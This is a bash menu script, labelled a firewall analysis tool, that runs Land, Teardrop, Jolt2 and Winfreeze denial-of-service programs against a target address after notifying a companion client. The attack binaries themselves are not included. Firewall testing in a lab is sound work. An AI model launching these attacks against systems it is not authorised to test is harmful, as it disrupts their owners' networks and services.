address=$1
clear
function Land_Attack {
	./client $address -L
	ch=$?
	case "$ch" in
		0) sleep 3
		   ./Land_Attack $address 1 6000
		   sleep 5
		   ./client $address -D
		   ./send_attack.sh $address
		   ;;
		*) echo -n "
	Can't send to server. Please try again.

	press any key."
		   read n
		   ./send_attack.sh $address
		   ;;
	esac
}
function Teardrop_Attack {
	./client $address -T
	ch=$?
	case "$ch" in
		0) sleep 3
		   ./Teardrop $address 1 6000
		   sleep 5
		   ./client $address -D
		   ./send_attack.sh $address
		   ;;
		*) echo -n "
	Can't send to server. Please try again.

	press any key."
		   read n
		   ./send_attack.sh $address
		   ;;
	esac
}
function Jolt {
	./client $address -J
	ch=$?
	case "$ch" in
		0) sleep 3
		   ./jolt $address -p 80
		   sleep 5
		   ./client $address -D
		   ./send_attack.sh $address
		   ;;
		*) echo -n "
	Can't send to server. Please try again.

	press any key."
		read n
		./send_attack.sh $address
		;;
	esac
}
function Winfreeze {
	./client $address -W
	ch=$?
	case "$ch" in
		0) sleep3
		   ./Winfreeze $address 
		   sleep 5
		   ./client $address -D
		   ./send_attack.sh $address
		   ;;
		*) echo -n "
	Can't send to server. Please try again.

	press any key."
		read n
		./send_attack.sh $address
		;;
	esac
}
echo -n "
	##################################################################
	##								##
	##			Firewall Analysis Tool			##
	##################################################################	
	##								##
	##	1. Land Attack						##
	##								##
	##	2. Teardrop Attack					##
	##								##	
	##	3. Jolt2						##
	##								##
	##	4. Winfreeze						##
	##								##
	##	5. Back to Home						##
	##								##
	##################################################################

	Please select the choice from menu : "
read choice
case "$choice" in
	1) Land_Attack
	   ;;
	2) Teardrop_Attack
	   ;;
	3) Jolt
	   ;;
	4) Winfreeze
	   ;;
	5) ./menu_tool.sh $address
	   ;;
	*) ./send_attack.sh $address
	   ;;
esac
